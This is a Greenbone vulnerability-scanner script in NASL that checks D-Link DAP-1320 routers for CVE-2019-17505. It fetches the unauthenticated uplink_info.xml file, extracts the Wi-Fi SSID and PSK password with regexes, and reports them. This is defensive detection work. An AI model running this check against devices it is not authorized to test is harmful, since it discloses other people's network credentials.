# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113546");
  script_version("2019-10-23T10:26:45+0000");
  script_tag(name:"last_modification", value:"2019-10-23 10:26:45 +0000 (Wed, 23 Oct 2019)");
  script_tag(name:"creation_date", value:"2019-10-23 11:41:42 +0200 (Wed, 23 Oct 2019)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_cve_id("CVE-2019-17505");

  script_name("D-Link DAP-1320 A2-V1.21 Routers Information Disclosure Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");

  # nb: With D-Link vulnerabilities, it is often that more than one device type is affected
  script_dependencies("gb_dlink_dsl_detect.nasl", "gb_dlink_dap_detect.nasl", "gb_dlink_dir_detect.nasl", "gb_dlink_dwr_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Host/is_dlink_device");

  script_tag(name:"summary", value:"D-Link DAP-1320 routers are prone to an information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to acquire sensitive information.");

  script_tag(name:"insight", value:"The file uplink_info.xml doesn't require authorization and
  contains the SSID and PSK password.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to gain the Wi-Fi credentials.");

  script_tag(name:"affected", value:"D-Link DAP-1320 A2 routers through firmware version 1.21.
  Other devices might also be affected.");

  script_tag(name:"solution", value:"No known solution is available as of 23rd October, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://github.com/dahua966/Routers-vuls/blob/master/DAP-1320/vuls_poc.md");

  exit(0);
}

CPE_PREFIX = "cpe:/o:d-link";

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

if( ! infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www", first_cpe_only: TRUE ) )
  exit( 0 );

port = infos["port"];
CPE  = infos["cpe"];

if( ! dir = get_app_location( cpe: CPE, port: port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

vuln_url = dir + "/uplink_info.xml";

buf = http_get_cache( port: port, item: vuln_url );

if( buf =~ "^HTTP/[0-9]\.[0-9] 200" ) {

  ssid = eregmatch( string: buf, pattern: '<wlan[0-9]?_ssid>([^<]+)</wlan[0-9]?_ssid>', icase: TRUE );
  psk = eregmatch( string: buf, pattern: '<wlan[0-9]?_psk_pass_phrase>([^<]+)</wlan[0-9]?_psk_pass_phrase>', icase: TRUE );

  if( ! isnull( ssid[1] ) && ! isnull( psk[1] ) ) {
    report = report_vuln_url( port: port, url: vuln_url );
    report += '\nIt was possible to acquire the following Wi-Fi credentials:\n';
    report += 'SSID: ' + ssid[1] + '\nPSK:  ' + psk[1];
    security_message( data: report, port: port );
    exit( 0 );
  }
}

exit( 99 );
